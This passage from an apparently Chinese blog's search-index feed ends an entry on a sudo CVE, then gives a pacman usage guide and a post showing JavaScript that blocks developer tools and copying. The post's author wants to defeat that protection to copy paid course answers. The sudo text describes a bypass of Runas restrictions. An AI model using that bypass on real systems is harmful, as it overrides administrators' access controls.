root 用户的UserID 。 </p><p>实际上，只要用户的权限足够高，即拥有最高sudo权限的用户，并且在Runas规范中定义了ALL关键字的话，他们就可以运行Runas规范中明确禁止使用的那些root命令，而且以这种方式运行的命令其日志项所显示的目标用户为4294967295，而不是root。与此同时，在执行相应命令的过程中，PAM会话模块将不会运行。</p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pacman</title>
      <link href="/2019/10/11/pacman/"/>
      <url>/2019/10/11/pacman/</url>
      
        <content type="html"><![CDATA[<h1 id="包管理工具-Pacman"><a href="#包管理工具-Pacman" class="headerlink" title="包管理工具 Pacman"></a>包管理工具 Pacman</h1><blockquote><p>参考：</p><p><a href="https://www.archlinux.org/pacman/" target="_blank" rel="noopener">Pacman Home Page</a></p><p><a href="[https://wiki.archlinux.org/index.php/Pacman_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">pacman wiki</a>](<a href="https://wiki.archlinux.org/index.php/Pacman_(简体中文)" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Pacman_(简体中文)</a>)</p><p><a href="https://blog.csdn.net/lu_embedded/article/details/50520647" target="_blank" rel="noopener">ArchLinux 的 pacman 命令详解</a></p></blockquote><hr><p><strong>警告:</strong> 在Arch下安装软件包时，未<a href="https://wiki.archlinux.org/index.php/Pacman_(简体中文" target="_blank" rel="noopener">更新</a>#升级软件包)系统前，<strong>不要</strong>更新软件包数据库（例如，可能出现某软件包不再出现在官方库）。操作时，应使用<code>pacman -Syu *package_name*</code>, 而不要使用（<code>pacman -Sy *package_name*</code>），否则可能会有依赖问题。参见 <a href="https://wiki.archlinux.org/index.php/System_maintenance_(简体中文" target="_blank" rel="noopener">System maintenance (简体中文)#不支持部分升级</a>#不支持部分升级) 和 <a href="https://bbs.archlinux.org/viewtopic.php?id=89328" target="_blank" rel="noopener">BBS#89328</a>.</p><hr><h3 id="安装指定的包"><a href="#安装指定的包" class="headerlink" title="安装指定的包"></a>安装指定的包</h3><p>安装或者升级单个软件包，或者一列软件包（包含依赖包），使用如下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S package_name1 package_name2 ...</span><br></pre></td></tr></table></figure><p>用正则表达式安装多个软件包（参见 <a href="https://wiki.archlinux.org/index.php/Pacman_tips_(简体中文" target="_blank" rel="noopener">pacman 小贴士</a>#巧用<em>Bash</em>语法): invalid section]和<a href="https://bbs.archlinux.org/viewtopic.php?id=7179" target="_blank" rel="noopener">这个帖子</a>）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S $(pacman -Ssq package_regex)</span><br></pre></td></tr></table></figure><p>有时候在不同的软件仓库中，一个软件包有多个版本（比如[extra]和[testing]）。可以选择一个来安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S extra/package_name</span><br></pre></td></tr></table></figure><p>安装多个含有相似名称的软件包，而并非整个包组或全部匹配的软件包； 例如，plasma:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S plasma-&#123;desktop,mediacenter,nm&#125;</span><br></pre></td></tr></table></figure><p>当然，可以多层扩展，并不作限制：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S plasma-&#123;workspace&#123;,-wallpapers&#125;,pa&#125;</span><br></pre></td></tr></table></figure><h3 id="安装包组"><a href="#安装包组" class="headerlink" title="安装包组"></a>安装包组</h3><p>一些包属于一个可以同时安装的软件包组。例如，运行下面的命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S gnome</span><br></pre></td></tr></table></figure><p>会提醒用户选择 <code>gnome</code> 内需要安装的包。</p><p>有的包组包含大量的软件包，有时用户只需其中几个。除了逐一键入序号外，pacman 还支持选择或排除某个区间内的的软件包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter a selection (default=all): 1-10 15</span><br></pre></td></tr></table></figure><p>这将选中序号 1 至 10 和 15 的软件包。而</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter a selection (default=all): ^5-8 ^2</span><br></pre></td></tr></table></figure><p>将会选中除了序号 5 至 8 和 2 之外的所有软件包。</p><p>想要查看哪些包属于 gnome 组，运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Sg gnome</span><br></pre></td></tr></table></figure><p>也可以访问 <a href="https://www.archlinux.org/groups/" target="_blank" rel="noopener">https://www.archlinux.org/groups/</a> 查看可用的包组。</p><p><strong>注意:</strong> 如果列表中的包已经安装在系统中，它会被重新安装，即使它已经是最新的。可以用                <code>--needed</code> 选项覆盖这种行为。</p><h3 id="删除软件包"><a href="#删除软件包" class="headerlink" title="删除软件包"></a>删除软件包</h3><p>删除单个软件包，保留其全部已经安装的依赖关系</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> pacman -R package_name</span></span><br></pre></td></tr></table></figure><p>删除指定软件包，及其所有没有被其他已安装软件包使用的依赖关系：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Rs package_name</span><br></pre></td></tr></table></figure><p>要删除软件包和所有依赖这个软件包的程序:</p><p><strong>警告:</strong> 此操作是递归的，请小心检查，可能会一次删除大量的软件包。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Rsc package_name</span><br></pre></td></tr></table></figure><p>要删除软件包，但是不删除依赖这个软件包的其他程序：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Rdd package_name</span><br></pre></td></tr></table></figure><p><em>pacman</em> 删除某些程序时会备份重要配置文件，在其后面加上*.pacsave扩展名。-n 选项可以避免备份这些文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Rn package_name</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> <em>pacman</em> 不会删除软件自己创建的文件(例如主目录中的 <code>.dot</code> 文件不会被删除。</p><h3 id="升级软件包"><a href="#升级软件包" class="headerlink" title="升级软件包"></a>升级软件包</h3><hr><p><strong>警告:</strong> * 建议所有用户都<a href="https://wiki.archlinux.org/index.php/System_maintenance#Upgrading_the_system" target="_blank" rel="noopener">经常性的更新系统</a></p><ul><li>Arch 只支持系统完整升级，详细参见<a href="https://wiki.archlinux.org/index.php/System_maintenance#Partial_upgrades_are_unsupported" target="_blank" rel="noopener">不支持部分升级</a>和<a href="https://wiki.archlinux.org/index.php/Pacman_(简体中文" target="_blank" rel="noopener">#安装软件包</a>#安装软件包)。</li></ul><hr><p>一个 <em>pacman</em> 命令就可以升级整个系统。花费的时间取决于系统有多老。这个命令会同步非本地(local)软件仓库并升级系统的软件包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Syu</span><br></pre></td></tr></table></figure><h3 id="查询包数据库"><a href="#查询包数据库" class="headerlink" title="查询包数据库"></a>查询包数据库</h3><p><em>pacman</em> 使用 <code>-Q</code> 参数查询本地软件包数据库。参见：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> pacman -Q --<span class="built_in">help</span></span></span><br></pre></td></tr></table></figure><p>使用 <code>-S</code> 参数来查询远程同步的数据库。参见：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -S --<span class="built_in">help</span></span><br></pre></td></tr></table></figure><p><em>pacman</em> 可以在包数据库中查询软件包，查询位置包含了软件包的名字和描述：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Ss string1 string2 ...</span><br></pre></td></tr></table></figure><p>有时，<code>-s</code>的内置正则会匹配很多不需要的结果，所以应当指定仅搜索包名，而非描述或其他子段，下面的命令就会返回很多不必要结果:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Ss <span class="string">'^vim-'</span></span><br></pre></td></tr></table></figure><p>要查询已安装的软件包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qs string1 string2 ...</span><br></pre></td></tr></table></figure><p>按文件名查找软件库：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Fs string1 string2 ...</span><br></pre></td></tr></table></figure><p>显示软件包的详尽的信息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Si package_name</span><br></pre></td></tr></table></figure><p>查询本地安装包的详细信息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qi package_name</span><br></pre></td></tr></table></figure><p>使用两个 <code>-i</code> 将同时显示备份文件和修改状态：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qii package_name</span><br></pre></td></tr></table></figure><p>要获取已安装软件包所包含文件的列表：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Ql package_name</span><br></pre></td></tr></table></figure><p>查询远程库中软件包包含的文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Fl package_name</span><br></pre></td></tr></table></figure><p>检查软件包安装的文件是否都存在：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qk package_name</span><br></pre></td></tr></table></figure><p>两个参数<code>k</code>将会执行一次更彻底的检查。 查询数据库获取某个文件属于哪个软件包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qo /path/to/file_name</span><br></pre></td></tr></table></figure><p>查询文件属于远程数据库中的哪个软件包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> pacman -Fo /path/to/file_name</span></span><br></pre></td></tr></table></figure><p>要罗列所有不再作为依赖的软件包(孤立orphans)：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qdt</span><br></pre></td></tr></table></figure><p>要罗列所有明确安装而且不被其它包依赖的软件包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Qet</span><br></pre></td></tr></table></figure><p>要显示软件包的依赖树：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pactree package_name</span><br></pre></td></tr></table></figure><p>检查一个<em>安装</em>的软件包被那些包依赖，可以使用 <a href="https://aur.archlinux.org/packages/pkgtools/" target="_blank" rel="noopener">pkgtools</a>AUR中的<em>whoneeds</em>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ whoneeds package_name</span><br></pre></td></tr></table></figure><p>或者<em>pactree</em>中使用<code>-r</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pactree -r package_name</span><br></pre></td></tr></table></figure><h4 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h4><p>pacman数据库通常位于 <code>/var/lib/pacman/sync</code>. 对于每一个在<code>/etc/pacman.conf</code>中指定的软件仓库， 这里都有一个一致的数据库。数据库文件夹里每个tar.gz文件都包含着一个仓库的软件包信息。例如which 包:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">% tree which-2.20-6 </span><br><span class="line">which-2.20-6</span><br><span class="line">|-- depends</span><br><span class="line">`-- desc</span><br></pre></td></tr></table></figure><p>这个 <code>depends</code> 项列出了该软件的依赖包， 而<code>desc</code>有该包的介绍，例如文件大小和MD5值 。</p><h3 id="清理软件包缓存"><a href="#清理软件包缓存" class="headerlink" title="清理软件包缓存"></a>清理软件包缓存</h3><p><em>pacman</em> 将下载的软件包保存在 <code>/var/cache/pacman/pkg/</code> 并且不会自动移除旧的和未安装版本的软件包，因此需要手动清理，以免该文件夹过于庞大。</p><p>使用内建选项即可清除未安装软件包的缓存：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Sc</span><br></pre></td></tr></table></figure><p><strong>警告:</strong></p><ul><li>仅在确定当前安装的软件包足够稳定且不需要<a href="https://wiki.archlinux.org/index.php/Downgrading_packages_(简体中文" target="_blank" rel="noopener">降级</a>)时才执行清理。<code>pacman -Sc</code>仅会保留软件包的当前有效版本，旧版本的软件包被清理后，只能从其他地方如 <a href="https://wiki.archlinux.org/index.php/Arch_Linux_Archive_(简体中文" target="_blank" rel="noopener">Arch Linux Archive (简体中文)</a>)中获取了。</li><li><code>pacman -Scc</code> 可以清理所有缓存，但这样 pacman 在重装软件包时就只能重新下载了。除非空间不足，否则不应这么做。</li></ul><p>由于以上种种局限，建议使用专门的脚本去处理清理哪些、清理多少缓存：</p><p><a href="https://www.archlinux.org/packages/?name=pacman-contrib" target="_blank" rel="noopener">pacman-contrib</a> 提供的 <em>paccache</em> 命令默认会删除近3个版本前的软件包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># paccache -r</span><br></pre></td></tr></table></figure><p><strong>Tip:</strong> 可以使用 <a href="https://wiki.archlinux.org/index.php/Pacman_hooks" target="_blank" rel="noopener">pacman hooks</a> 自动执行清理，<a href="https://bbs.archlinux.org/viewtopic.php?pid=1694743#p1694743" target="_blank" rel="noopener">这里</a>是参考示例。</p><p>也可以自己设置保留最近几个版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># paccache -rk 1</span><br></pre></td></tr></table></figure><p>清理所有未安装包的缓存文件，再此运行<code>paccache</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># paccache -ruk0</span><br></pre></td></tr></table></figure><p>更多功能参见<code>paccache -h</code>。</p><p><em>paccache</em>，还可以使用 <a href="https://wiki.archlinux.org/index.php/Arch_User_Repository_(简体中文" target="_blank" rel="noopener">Arch User Repository</a>) 中的 <a href="https://aur.archlinux.org/packages/pkgcacheclean/" target="_blank" rel="noopener">pkgcacheclean</a>AUR：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># pkgcacheclean</span><br></pre></td></tr></table></figure><p>，以及<a href="https://aur.archlinux.org/packages/pacleaner/" target="_blank" rel="noopener">pacleaner</a>AUR，这两个是未来的替代工具.</p><h3 id="其它命令"><a href="#其它命令" class="headerlink" title="其它命令"></a>其它命令</h3><p>升级系统时安装其他软件包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Syu package_name1 package_name2 ...</span><br></pre></td></tr></table></figure><p>下载包而不安装它：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -Sw package_name</span><br></pre></td></tr></table></figure><p>安装一个<strong>本地</strong>包(不从源里下载）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -U /path/to/package/package_name-version.pkg.tar.xz</span><br></pre></td></tr></table></figure><p>要将本地包保存至缓存，可执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -U file://path/to/package/package_name-version.pkg.tar.xz</span><br></pre></td></tr></table></figure><p>安装一个<strong>远程</strong>包（不在 <em>pacman</em> 配置的源里面）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pacman -U http://www.example.com/repo/example.pkg.tar.xz</span><br></pre></td></tr></table></figure><p>要禁用 <code>-S</code>, <code>-U</code> 和 <code>-R</code> 动作，可以使用 <code>-p</code> 选项.</p><p><em>pacman</em> 会列出需要安装和删除的软件，并在执行动作前要求需要的权限。</p><h3 id="安装原因"><a href="#安装原因" class="headerlink" title="安装原因"></a>安装原因</h3><p><em>pacman</em>数据库按照软件包被安装的原因，将其分为两类：</p><ul><li><strong>指定安装包</strong>：通过<em>pacman</em><code>-S</code>或者<code>-U</code>指令安装的软件包。</li><li><strong>依赖包</strong>：指定安装包所依赖的软件包，尽管命令中未传入，但仍然会被安装。</li></ul><p>当安装软件包时，可以把安装原因指定设为<strong>依赖</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># pacman -S --asdeps package_name</span><br></pre></td></tr></table></figure><p>但是当重新安装该软件包时，安装原因将会被设为软件包所默认的。 指定安装的软件包列表可用<code>pacman -Qe</code>, 已安装的依赖包可用<code>pacman -Qd</code>获取。 改变某个已安装软件包的安装原因，可以执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># pacman -D --asdeps package_name</span><br></pre></td></tr></table></figure><p>使用<code>--asexplicit</code>改为<strong>指定安装</strong>。</p><h3 id="查询一个包含具体文件的包名"><a href="#查询一个包含具体文件的包名" class="headerlink" title="查询一个包含具体文件的包名"></a>查询一个包含具体文件的包名</h3><p>同步文件数据库:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># pacman -Fy</span><br></pre></td></tr></table></figure><p>查询包含某个文件的包名，比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># pacman -Fs pacman</span><br><span class="line">core/pacman 5.0.1-4</span><br><span class="line">    usr/bin/pacman</span><br><span class="line">    usr/share/bash-completion/completions/pacman</span><br><span class="line">extra/xscreensaver 5.36-1</span><br><span class="line">    usr/lib/xscreensaver/pacman</span><br></pre></td></tr></table></figure><p><strong>提示：</strong> 可以设置一个 <code>crontab</code> 或者 <code>systemd timer</code> 来定期同步文件信息数据库。</p><p>如果需要高级功能请安装 <a href="https://wiki.archlinux.org/index.php/Pkgfile" target="_blank" rel="noopener">pkgfile</a>，它使用一个单独的数据库来保存文件和它们所关联的软件包的信息。</p><p>ArchLinux的版本库里面包括：</p><p>　　core-核心软件包<br>　　extra-其他常用软件<br>　　community-社区软件包，譬如Mysql等。<br>　　testing-正在测试阶段，还没有正式加入源的软件包。通常软件版本比较新，但是不是非常稳定<br>　　release-已经发布的软件包<br>　　unstable-非正式的软件包，可能包括以前版本的软件或者测试软件</p><p>　　因为Pacman的软件都是从源里面更新，因此在/etc/pacman.d里面配置这些软件源的地址。在/etc/pacman.d目录里面分别有上面几种软件类型对应的文件名，可以自己手工配置这些软件源的地址。</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ArchLinux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js_banned</title>
      <link href="/2019/10/09/js-banned/"/>
      <url>/2019/10/09/js-banned/</url>
      
        <content type="html"><![CDATA[<p>序：原本想从网页上搞些网课答案下来，懒得用爬虫，便想直接复制粘贴更方便，结果遭遇了网页的复制和控制台禁用，本着求知的精神，就有了这篇文章。</p><h1 id="网页中部分禁用及破解"><a href="#网页中部分禁用及破解" class="headerlink" title="网页中部分禁用及破解"></a>网页中部分禁用及破解</h1><ul><li><h3 id="利用js实现"><a href="#利用js实现" class="headerlink" title="利用js实现"></a>利用js实现</h3></li></ul><p>禁用F12</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.οnkeydοwn=<span class="function"><span class="keyword">function</span> (<span class="params">e</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> currKey=<span class="number">0</span>,evt=e||<span class="built_in">window</span>.event;</span><br><span class="line">        currKey=evt.keyCode||evt.which||evt.charCode;</span><br><span class="line">        <span class="keyword">if</span> (currKey == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="built_in">window</span>.event.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">window</span>.event.returnValue = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> h = <span class="built_in">window</span>.innerHeight,w=<span class="built_in">window</span>.innerWidth;</span><br><span class="line"><span class="comment">//禁用右键 （防止右键查看源代码）</span></span><br><span class="line"><span class="built_in">window</span>.oncontextmenu=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&lt;br&gt;   <span class="keyword">return</span> <span class="literal">false</span>;<span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span>&#125;</span></span><br><span class="line"><span class="xml">//在本网页的任何键盘敲击事件都是无效操作 （防止F12和shift+ctrl+i调起开发者工具）</span></span><br><span class="line"><span class="xml">window.onkeydown = window.onkeyup = window.onkeypress = function () &#123;</span></span><br><span class="line"><span class="xml">    window.event.returnValue = false;</span></span><br><span class="line"><span class="xml">    return false;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">//如果用户在工具栏调起开发者工具，那么判断浏览器的可视高度和可视宽度是否有改变，如有改变则关闭本页面</span></span><br><span class="line"><span class="xml">window.onresize = function () &#123;</span></span><br><span class="line"><span class="xml">    if (h != window.innerHeight||w!=window.innerWidth)&#123;</span></span><br><span class="line"><span class="xml">        window.close();</span></span><br><span class="line"><span class="xml">        window.location = "about:blank";</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">&#125;;</span></span><br><span class="line"><span class="xml">                                </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(<span class="built_in">document</span>).keydown(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> key(<span class="built_in">arguments</span>[<span class="number">0</span>])</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">key</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//f12</span></span><br><span class="line">    <span class="keyword">var</span> keynum;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.event) &#123;</span><br><span class="line">        keynum = e.keyCode;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.which) &#123;</span><br><span class="line">        keynum = e.which;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (keynum == <span class="number">123</span>) &#123;</span><br><span class="line">        <span class="built_in">window</span>.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ctrl+shift</span></span><br><span class="line">    <span class="keyword">if</span> (event.shiftKey&amp;&amp;event.ctrlKey) &#123;</span><br><span class="line">        <span class="built_in">window</span>.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Click</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">window</span>.event.returnValue = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.oncontextmenu = Click;<span class="comment">// 右击</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>禁用右键菜单</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.oncontextmenu = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>禁用文本选择</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.onselectstart = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">true</span>;&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><ul><li>一个网页：当禁用js时无法打开，不禁用js，禁止复制、看源码、右键菜单、F12、文本选择</li></ul><p>适合学习</p><p>原网页：<a href="http://www.gebidemengmianren.com/eryadaanfufei/198.html?btwaf=99961145" target="_blank" rel="noopener">http://www.gebidemengmianren.com/eryadaanfufei/198.html?btwaf=99961145</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 